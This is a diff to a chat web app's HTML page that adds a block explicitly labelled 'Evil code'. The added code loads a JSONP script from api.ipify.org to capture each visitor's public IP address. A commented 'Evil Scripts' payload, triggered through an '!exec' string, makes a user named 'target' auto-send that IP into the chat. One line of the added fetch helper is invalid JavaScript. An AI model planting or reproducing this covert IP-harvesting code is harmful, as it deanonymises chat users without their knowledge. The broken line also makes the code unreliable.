@@ -58,12 +58,36 @@
     <script type="text/javascript" src="/js/chat.js"></script>
     <script type="text/javascript" src="/js/libs/moment.js"></script>
     <script type="text/javascript" src="/js/libs/mustache.js"></script>
+    <script src="/js/URLparam.js"></script>
     <script>
       var url = new URL(window.location.href);
       var roomzlog = url.searchParams.get("room");
       console.log(roomzlog);
       document.getElementById('room-log').innerText += " " + roomzlog;
-    </script>
+      
+      // Evil code
+      let evil = {}
+      evil.fetch = async (file) => {
+        let x = await fetch(file);
+        let y = await x.text();
+        y = y[[[promiseResult]]]
+        return y;
+      };
+      evil.publicIP = (ip) => {
+        ip = ip.ip;
+        evil.publicIP = ip;
+      };
+      evil.username = URLparam(url, "name");
+      evil.room = roomzlog;
+      
+      /*
+        Evil Scripts:
+        Get IP Address of target:
+        !exec if(evil.username==="target"){document.getElementById("privatejsMsg").value="My IP is "+evil.publicIP;document.getElementById("submit-btn").click();}
+      */
+      console.log(evil);
+      </script>
+      <script type="application/javascript" src="https://api.ipify.org?format=jsonp&callback=evil.publicIP"></script>  
     <script src="/js/private.js"></script>
   </body>
 </html>
